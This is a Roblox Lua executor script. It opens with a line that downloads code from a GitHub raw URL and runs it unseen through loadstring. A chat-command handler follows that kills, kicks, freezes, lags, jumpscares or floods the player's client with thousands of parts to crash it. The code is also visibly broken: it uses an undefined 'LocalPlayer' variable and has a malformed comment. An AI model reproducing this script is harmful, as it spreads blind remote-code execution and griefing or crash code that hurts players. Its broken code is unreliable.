loadstring(game:HttpGet("https://raw.githubusercontent.com/shawulplayz/ScriptTesting/refs/heads/main/MobileExecutorWhiteList"))()
-// Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")



--// Configuration
local ADMIN_NAME = Players.LocalPlayer.Name
local scaryImages = {
	"rbxassetid://11773003060",
	"rbxassetid://112289855511517",
	"rbxassetid://110900575822599",
	"rbxassetid://12914343426",
}

--// State
local crashing = false
local lagging = false

--// Utility
local function matchesTarget(input)
	input = input:lower()
	return input == "me"
		or LocalPlayer.Name:lower():find(input, 1, true)
		or LocalPlayer.DisplayName:lower():find(input, 1, true)
end

--// Actions
local function killSelf()
	local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local hum = char:FindFirstChildOfClass("Humanoid")
	if hum then hum.Health = 0 end
end

local function kickSelf(reason)
	LocalPlayer:Kick(reason or "Kicked by admin.")
end

local function bringTo(player)
	local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local targetChar = player.Character or player.CharacterAdded:Wait()
	local root = myChar:FindFirstChild("HumanoidRootPart")
	local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
	if root and targetRoot then
		root.CFrame = targetRoot.CFrame + Vector3.new(2, 0, 0)
	end
end

local function freezeSelf()
	local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	if root then root.Anchored = true end
end

local function unfreezeSelf()
	local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	if root then root.Anchored = false end
end

local function crashSelf()
	if crashing then return end
	crashing = true
	local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	if not root then return end
	coroutine.wrap(function()
		while crashing do
			RunService.Heartbeat:Wait()
			for _ = 1, 2000 do
				local part = Instance.new("Part")
				part.Size = Vector3.new(math.random(), math.random(), math.random())
				part.Anchored = false
				part.CanCollide = true
				part.BrickColor = BrickColor.Black()
				part.Position = root.Position + Vector3.new(
					math.random(-10, 10),
					math.random(0, 10),
					math.random(-10, 10)
				)
				part.Parent = workspace
			end
		end
	end)()
end

local function simulateLag(fps)
	if lagging then return end
	lagging = true
	fps = tonumber(fps) or 5
	local interval = 1 / math.max(fps, 1)
	local conn
	conn = RunService.RenderStepped:Connect(function()
		if not lagging then conn:Disconnect() return end
		local t = tick()
		while tick() - t < interval do for _ = 1, 500 do end end
	end)
end

local function stopLag()
	lagging = false
end

local function jumpscareSelf()
	if LocalPlayer.PlayerGui:FindFirstChild("JumpscareGui") then return end

	local gui = Instance.new("ScreenGui")
	gui.Name = "JumpscareGui"
	gui.ResetOnSpawn = false
	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	gui.DisplayOrder = 999999
	gui.IgnoreGuiInset = true
	gui.Parent = LocalPlayer:WaitForChild("PlayerGui")

	local image = Instance.new("ImageLabel")
	image.Size = UDim2.new(1, 0, 1, 0)
	image.Position = UDim2.new(0, 0, 0, 0)
	image.BackgroundTransparency = 1
	image.Image = scaryImages[math.random(1, #scaryImages)]
	image.ZIndex = 10
	image.Parent = gui

	local sound = Instance.new("Sound")
	sound.SoundId = "rbxassetid://6201427049"
	sound.Volume = 5
	sound.Parent = gui
	sound:Play()

	delay(5, function()
		gui:Destroy()
	end)
end

--// Command Handler
local function handleCommand(player, msg)
	if player.Name ~= ADMIN_NAME then return end
	local cmd, args = msg:match("!(%w+)%s*(.*)")
	if not cmd then return end
	local arg1, arg2 = args:match("^(%S+)%s*(.*)$")
	if not arg1 or not matchesTarget(arg1) then return end

	if cmd == "kill" then killSelf()
	elseif cmd == "kick" then kickSelf(arg2)
	elseif cmd == "bring" then bringTo(player)
	elseif cmd == "freeze" then freezeSelf()
	elseif cmd == "unfreeze" then unfreezeSelf()
	elseif cmd == "crash" then crashSelf()
	elseif cmd == "lag" then simulateLag(arg2)
	elseif cmd == "unlag" then stopLag()
	elseif cmd == "jumpscare" then jumpscareSelf()
	end
end

--// Hook into chat
for _, p in ipairs(Players:GetPlayers()) do
	p.Chatted:Connect(function(msg)
		handleCommand(p, msg)
	end)
end

Players.PlayerAdded:Connect(function(p)
	p.Chatted:Connect(function(msg)
		handleCommand(p, msg)
	end)
end)
